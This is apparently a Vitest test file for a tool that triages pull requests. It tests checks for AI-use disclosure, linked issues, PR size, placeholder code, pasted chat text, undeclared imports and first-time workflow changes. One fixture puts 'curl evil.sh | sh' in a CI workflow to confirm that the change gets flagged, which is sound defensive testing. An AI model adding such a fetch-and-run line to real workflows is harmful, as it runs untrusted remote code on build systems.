import { describe, expect, it } from 'vitest';
import { evaluate, shouldSkip, decide } from '../src/engine';
import { DEFAULT_POLICY, parsePolicy, PolicyError, type Policy } from '../src/policy';
import { fingerprint, proofMarker } from '../src/proof';
import { parseDisclosure, hasLinkedIssue, meaningfulBody } from '../src/checks';
import { jsPackageName, pyImports, pyImportKnown } from '../src/imports';
import type { ChangedFile, PrContext } from '../src/types';

const GOOD_BODY = `Fixes #42

The date parser crashed on ISO strings with a timezone offset because we split on "+".
I switched to the built-in parser and added a test with three offsets.

AI-Assisted: partial`;

function patch(lines: string[]): string {
  return `@@ -1,1 +1,${lines.length} @@\n` + lines.map((l) => `+${l}`).join('\n');
}

function file(filename: string, lines: string[] = ['const a = 1;'], status: ChangedFile['status'] = 'modified'): ChangedFile {
  return { filename, status, additions: lines.length, deletions: 0, patch: patch(lines), sha: 'a'.repeat(40) };
}

function ctx(over: Partial<PrContext> = {}): PrContext {
  return {
    title: 'Fix timezone parsing in date util',
    body: GOOD_BODY,
    author: { login: 'alice', accountAgeDays: 900, isBot: false, isFirstTimeContributor: true, isMaintainer: false, prsOpenedLast24h: 1 },
    files: [file('src/date.ts', ["import { parse } from 'date-fns';", 'export const x = parse;']), file('src/date.test.ts', ['it("works", () => {});'])],
    manifests: { npm: new Set(['date-fns', 'vitest']) },
    ...over,
  };
}

const policy = (over: Partial<Policy> = {}): Policy => ({ ...structuredClone(DEFAULT_POLICY), ...over });

describe('a good PR', () => {
  it('is verified', () => {
    const r = evaluate(ctx(), policy({ require_linked_issue: true, require_tests_for_code_changes: true }));
    expect(r.findings.filter((f) => f.kind !== 'hint')).toEqual([]);
    expect(r.verdict).toBe('verified');
  });
});

describe('policy checks', () => {
  it('asks for disclosure when required', () => {
    const r = evaluate(ctx({ body: GOOD_BODY.replace('AI-Assisted: partial', '') }), policy());
    expect(r.findings.map((f) => f.id)).toContain('ai-disclosure');
    expect(r.verdict).toBe('needs-info');
  });
  it('rejects declared AI use when not allowed', () => {
    const r = evaluate(ctx(), policy({ ai_policy: 'not_allowed' }));
    expect(r.findings.find((f) => f.id === 'ai-disclosure')?.title).toMatch(/does not accept/);
  });
  it('accepts AI-Assisted: no when not allowed', () => {
    const r = evaluate(ctx({ body: GOOD_BODY.replace('partial', 'no') }), policy({ ai_policy: 'not_allowed' }));
    expect(r.findings.map((f) => f.id)).not.toContain('ai-disclosure');
  });
  it('requires a linked issue only when configured', () => {
    const body = GOOD_BODY.replace('Fixes #42', '');
    expect(evaluate(ctx({ body }), policy()).findings.map((f) => f.id)).not.toContain('linked-issue');
    expect(evaluate(ctx({ body }), policy({ require_linked_issue: true })).findings.map((f) => f.id)).toContain('linked-issue');
  });
  it('flags empty template descriptions', () => {
    const body = '<!-- Describe your change -->\n## Summary\n\n## Checklist\n- [ ] Tests\nAI-Assisted: no';
    const r = evaluate(ctx({ body }), policy());
    expect(r.findings.find((f) => f.id === 'description')?.title).toMatch(/empty/);
  });
  it('flags oversized PRs but ignores lockfiles', () => {
    const big = { ...file('src/big.ts'), additions: 900 };
    const lock = { ...file('package-lock.json'), additions: 50000 };
    expect(evaluate(ctx({ files: [lock, file('src/a.ts'), file('src/a.test.ts')] }), policy()).findings.map((f) => f.id)).not.toContain('size-lines');
    expect(evaluate(ctx({ files: [big] }), policy()).findings.map((f) => f.id)).toContain('size-lines');
  });
  it('treats missing tests as a hint unless required', () => {
    const files = [file('src/date.ts')];
    expect(evaluate(ctx({ files }), policy()).findings.find((f) => f.id === 'tests')?.kind).toBe('hint');
    expect(evaluate(ctx({ files }), policy({ require_tests_for_code_changes: true })).findings.find((f) => f.id === 'tests')?.kind).toBe('policy');
  });
});

describe('slop signals', () => {
  it('detects placeholder code', () => {
    const files = [file('src/api.ts', ['// ... existing code ...', 'export function f() {}']), file('src/api.test.ts')];
    const r = evaluate(ctx({ files }), policy());
    expect(r.findings.find((f) => f.id === 'placeholder-code')?.kind).toBe('signal');
    expect(r.verdict).toBe('needs-info');
  });
  it('detects agent summary docs but not normal docs', () => {
    const files = [file('IMPLEMENTATION_SUMMARY.md', ['# Summary'], 'added'), file('docs/SUMMARY.md', ['x'], 'added'), file('CHANGELOG.md', ['x'], 'added')];
    const r = evaluate(ctx({ files }), policy());
    const f = r.findings.find((x) => x.id === 'summary-docs');
    expect(f?.detail).toContain('IMPLEMENTATION_SUMMARY.md');
    expect(f?.detail).not.toContain('docs/SUMMARY.md');
  });
  it('detects JS imports of packages not in package.json', () => {
    const files = [file('src/x.ts', ["import { magic } from 'super-ai-helper';", "import fs from 'node:fs';", "import path from 'path';", "import y from './y';", "import z from '@/lib/z';"])];
    const r = evaluate(ctx({ files }), policy());
    const f = r.findings.find((x) => x.id === 'unknown-imports');
    expect(f?.kind).toBe('signal');
    expect(f?.detail).toContain('super-ai-helper');
    expect(f?.detail).not.toContain('node:fs');
  });
  it('downgrades unknown imports to a hint when manifests are incomplete (monorepos)', () => {
    const files = [file('packages/a/x.ts', ["import { y } from '@acme/internal';"])];
    const r = evaluate(ctx({ files, manifests: { npm: new Set(), npmIncomplete: true } }), policy());
    expect(r.findings.find((x) => x.id === 'unknown-imports')?.kind).toBe('hint');
  });
  it('detects Python imports not declared, but knows stdlib, aliases and local modules', () => {
    const files = [file('app/main.py', ['import os, json', 'import yaml', 'from PIL import Image', 'from myapp.utils import x', 'import totally_fake_lib'])];
    const r = evaluate(ctx({ files, manifests: { python: new Set(['pyyaml', 'pillow']), pythonLocalModules: new Set(['myapp']) } }), policy());
    const f = r.findings.find((x) => x.id === 'unknown-imports');
    expect(f?.detail).toContain('totally_fake_lib');
    expect(f?.detail).not.toMatch(/`(os|json|yaml|PIL|myapp)`/);
  });
  it('flags first-time workflow changes', () => {
    const files = [file('.github/workflows/ci.yml', ['run: curl evil.sh | sh'])];
    expect(evaluate(ctx({ files }), policy()).findings.map((f) => f.id)).toContain('workflow-changes');
  });
  it('quarantines spray behaviour', () => {
    const c = ctx();
    c.author.prsOpenedLast24h = 40;
    expect(evaluate(c, policy()).verdict).toBe('quarantine');
  });
  it('detects pasted chat output', () => {
    const body = GOOD_BODY + '\n\nCertainly! Here is the updated code. I hope this helps!';
    expect(evaluate(ctx({ body }), policy()).findings.find((f) => f.id === 'chat-paste')?.kind).toBe('signal');
  });
  it('quarantines when two signals stack', () => {
    const body = GOOD_BODY + '\n\nI hope this helps!';
    const files = [file('src/a.ts', ['// TODO: implement actual logic']), file('src/a.test.ts')];
    expect(evaluate(ctx({ body, files }), policy()).verdict).toBe('quarantine');
  });
  it('never lets hints change the verdict', () => {
    const c = ctx();
    c.author.accountAgeDays = 1;
    const r = evaluate(c, policy());
    expect(r.findings.find((f) => f.id === 'new-account')?.kind).toBe('hint');
    expect(r.verdict).toBe('verified');
  });
});

describe('skipping', () => {
  it('skips bots, allowlisted users, maintainers and returning contributors', () => {
    expect(shouldSkip(ctx({ author: { ...ctx().author, login: 'dependabot[bot]', isBot: true } }), policy())).toBeTruthy();
    expect(shouldSkip(ctx(), policy({ allowlist: ['Alice'] }))).toBeTruthy();
    expect(shouldSkip(ctx({ author: { ...ctx().author, isMaintainer: true } }), policy())).toBeTruthy();
    expect(shouldSkip(ctx({ author: { ...ctx().author, isFirstTimeContributor: false } }), policy())).toBeTruthy();
    expect(shouldSkip(ctx(), policy())).toBeUndefined();
  });
});

describe('proof', () => {
  it('validates a matching fingerprint and rejects a stale one', () => {
    const c = ctx();
    const fp = fingerprint(c.files);
    const valid = evaluate({ ...c, body: c.body + '\n' + proofMarker(fp) }, policy());
    expect(valid.proof).toEqual({ present: true, valid: true });
    const changed = c.files.map((f, i) => (i === 0 ? { ...f, sha: 'b'.repeat(40) } : f));
    const stale = evaluate({ ...c, files: changed, body: c.body + '\n' + proofMarker(fp) }, policy());
    expect(stale.proof?.valid).toBe(false);
    expect(stale.findings.map((f) => f.id)).toContain('proof');
  });
});

describe('policy parsing', () => {
  it('uses defaults for empty config', () => {
    expect(parsePolicy('').policy).toEqual(DEFAULT_POLICY);
  });
  it('parses valid config and warns on unknown keys', () => {
    const { policy: p, warnings } = parsePolicy('ai_policy: not_allowed\nmax_changed_lines: 300\nlables: {}\n');
    expect(p.ai_policy).toBe('not_allowed');
    expect(p.max_changed_lines).toBe(300);
    expect(warnings[0]).toMatch(/lables/);
  });
  it('rejects invalid values with clear errors', () => {
    expect(() => parsePolicy('ai_policy: maybe')).toThrow(PolicyError);
    expect(() => parsePolicy('max_changed_lines: -5')).toThrow(/number/);
    expect(() => parsePolicy('- just a list')).toThrow(/mapping/);
  });
});

describe('helpers', () => {
  it('parses disclosure variants', () => {
    expect(parseDisclosure('**AI-Assisted:** Yes')).toBe('yes');
    expect(parseDisclosure('AI assistance: none')).toBe('no');
    expect(parseDisclosure('AI used - partial')).toBe('partial');
    expect(parseDisclosure('nothing here')).toBeUndefined();
  });
  it('finds linked issues', () => {
    expect(hasLinkedIssue('Fixes #12')).toBe(true);
    expect(hasLinkedIssue('see https://github.com/a/b/issues/3')).toBe(true);
    expect(hasLinkedIssue('color: #fff and &#123;')).toBe(false);
  });
  it('strips template noise from the body', () => {
    expect(meaningfulBody('<!-- x -->\n## Title\n- [ ] item\nreal text')).toBe('real text');
  });
  it('resolves npm package names', () => {
    expect(jsPackageName('@scope/pkg/sub')).toBe('@scope/pkg');
    expect(jsPackageName('lodash/merge')).toBe('lodash');
    expect(jsPackageName('virtual:pwa')).toBeUndefined();
    expect(jsPackageName('fs/promises')).toBeUndefined();
    expect(jsPackageName('src/lib', ['src/*'])).toBeUndefined();
  });
  it('parses python imports', () => {
    expect(pyImports('import os.path as p, sys')).toEqual(['os', 'sys']);
    expect(pyImports('from a.b import c')).toEqual(['a']);
    expect(pyImportKnown('google', new Set(['google-cloud-storage']), new Set())).toBe(true);
  });
});

describe('decide', () => {
  it('follows the documented rules', () => {
    const s = { id: 'x', kind: 'signal' as const, title: '', detail: '', fix: '' };
    const p = { ...s, id: 'y', kind: 'policy' as const };
    expect(decide([])).toBe('verified');
    expect(decide([p])).toBe('needs-info');
    expect(decide([s])).toBe('needs-info');
    expect(decide([s, p])).toBe('quarantine');
    expect(decide([s, { ...s, id: 'z' }])).toBe('quarantine');
  });
});

import { loadManifests } from '../src/manifests';

describe('false alarms found by the benchmark', () => {
  const reader = (files: Record<string, string>, dirs: Record<string, { path: string; type: string }[]>) => ({
    read: async (p: string) => files[p],
    list: async (d: string) => dirs[d] ?? [],
  });

  it('does not flag imports of the project\'s own folders (VS Code "vs/...")', async () => {
    const changed = [file('src/vs/editor/browser/widget.ts', ["import { Emitter } from 'vs/base/common/event';", "import x from 'left-pad-ai';"])];
    const manifests = await loadManifests(
      reader({ 'package.json': JSON.stringify({ name: 'code-oss', dependencies: {} }) }, { '': [{ path: 'package.json', type: 'blob' }, { path: 'src', type: 'tree' }], src: [{ path: 'vs', type: 'tree' }] }),
      changed,
    );
    const r = evaluate(ctx({ files: changed, manifests }), policy());
    const f = r.findings.find((x) => x.id === 'unknown-imports');
    expect(f?.detail).toContain('left-pad-ai');
    expect(f?.detail).not.toContain('`vs`');
  });

  it('follows "-r" includes in requirements files (Home Assistant style)', async () => {
    const changed = [file('tests/components/alert/test_init.py', ['from freezegun import freeze_time', 'import made_up_lib'])];
    const manifests = await loadManifests(
      reader(
        {
          'requirements_test.txt': '-r requirements.txt\n-c constraints/base.txt\npytest==8.0\n',
          'requirements.txt': '-r requirements_core.txt\n',
          'requirements_core.txt': 'freezegun==1.5\n',
          'constraints/base.txt': 'urllib3<3\n',
        },
        { '': [{ path: 'requirements_test.txt', type: 'blob' }, { path: 'requirements.txt', type: 'blob' }, { path: 'tests', type: 'tree' }] },
      ),
      changed,
    );
    expect(manifests.python?.has('freezegun')).toBe(true);
    expect(manifests.python?.has('urllib3')).toBe(true);
    const f = evaluate(ctx({ files: changed, manifests }), policy()).findings.find((x) => x.id === 'unknown-imports');
    expect(f?.detail).toContain('made_up_lib');
    expect(f?.detail).not.toContain('freezegun');
  });
});

describe('false alarms found by benchmark v2', () => {
  it('knows SCons build scripts and pytest plugins', () => {
    expect(pyImportKnown('SCons', new Set(), new Set())).toBe(true);
    expect(pyImportKnown('pytest_homeassistant', new Set(), new Set())).toBe(true);
  });
  it('reports unknown imports in test files only as a note', () => {
    const files = [file('tests/components/vesync/conftest.py', ['import some_test_helper_pkg'])];
    const r = evaluate(ctx({ files, manifests: { python: new Set(['requests']) } }), policy());
    expect(r.findings.find((f) => f.id === 'unknown-imports')?.kind).toBe('hint');
  });
  it('still flags unknown imports in normal source files', () => {
    const files = [file('app/service.py', ['import totally_made_up_sdk'])];
    const r = evaluate(ctx({ files, manifests: { python: new Set(['requests']) } }), policy());
    expect(r.findings.find((f) => f.id === 'unknown-imports')?.kind).toBe('signal');
  });
});
